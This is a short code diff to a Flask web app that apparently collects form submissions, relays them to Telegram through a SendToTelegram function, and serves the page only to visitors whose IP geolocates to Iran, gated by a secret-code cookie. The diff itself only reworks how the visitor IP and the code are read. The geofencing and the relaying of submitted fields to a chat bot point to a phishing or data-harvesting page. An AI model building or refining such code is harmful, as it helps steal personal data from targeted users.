@@ -68,15 +68,15 @@ def SendToTelegram(f1 , f2 , f3 , visited , submited , id):
         if SendMessageToTelegramIndirect(message):
             break
 
-def ipaddress(request):
-    try:
-        if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
-            ip_addr = request.environ['REMOTE_ADDR']
-        else:
-            ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
-        return ip_addr
-    except Exception as err:
-        print(f"Error getting ipaddress : {err}")
+# def ipaddress(request):
+#     try:
+#         if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
+#             ip_addr = request.environ['REMOTE_ADDR']
+#         else:
+#             ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
+#         return ip_addr
+#     except Exception as err:
+#         print(f"Error getting ipaddress : {err}")
 
 def GenerateSCode():
     r = ""
@@ -86,10 +86,9 @@ def GenerateSCode():
 
 @app.route('/', methods=['GET', 'POST'])
 def form_page():
-    print(request.headers.get('CF-Connecting-IP'))
-    Scode = request.headers.get('CF-Connecting-IP')
+    Scode = request.cookies.get('SecretCode')
     # Ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr) 
-    Ip = ipaddress(request)
+    Ip = request.headers.get('CF-Connecting-IP')
     # IsFromIran = True  # For Debug
     IsFromIran = requests.get(f"https://geolocation-db.com/json/{Ip}&position=true").json().get("country_name") == "Iran"
     if not IsFromIran:
